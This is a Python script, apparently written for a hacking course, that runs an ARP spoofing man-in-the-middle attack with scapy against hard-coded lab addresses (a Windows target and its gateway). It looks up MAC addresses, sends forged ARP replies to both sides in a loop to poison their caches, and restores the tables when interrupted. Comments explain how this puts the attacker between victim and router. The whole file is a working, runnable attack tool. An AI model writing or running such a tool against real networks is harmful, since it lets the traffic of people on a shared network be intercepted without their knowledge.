#!/usr/bin/env python

import scapy.all as scapy
import time



def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #we created an ARP packet object
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # srp = send & receive the packet
    #[0] gives us the first element from the answered list;
    #this line returns two lists answered lists and unanswered lists
    #but we don't want to keep a variable unused so hence [0]
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


#op=1 is request; op=2 response
#pdst is the IP of the target computer in this case windows
#hwdst is the mac address of the kali machine
#psrc is the IP of the router
#when we send the ARP response the victim machine will update the routers'
#MAC address on their routing table to the kali machine allowing us to get in the middle
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

#we are restoring the mac address after our attack is over
#scapy automatically assigns the attackers mac address which is why in the spoof function
#we did not need to assign a destination mac address
#here we do have to assign a destination mac address to tell scapy not to use our own
def restored(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac,
                       psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


sent_packet_count = 0
target_ip = "10.0.2.6"
gateway_ip = "10.0.2.1"
try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        #at the end of a print statement there's a new line character
        #which is why on the terminal every packet sent is printed on a new line
        #to have the print function remove that new line character we add a comma
        #at the end of line 38. The problem is now stuff won't be printed on our terminal
        #Why? because the packets sent are being placed in a buffer
        #to fix this we need to tell python to flush this buffer
        #backslash r tells python to print from the start of the line
        # well apparently this is for python2.7 and below the solution for python3 is below
        print("[+] Packets Sent: " + str(sent_packet_count), end='\r')
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C .......Quiting")
    restored(target_ip, gateway_ip)
    restored(gateway_ip, target_ip)

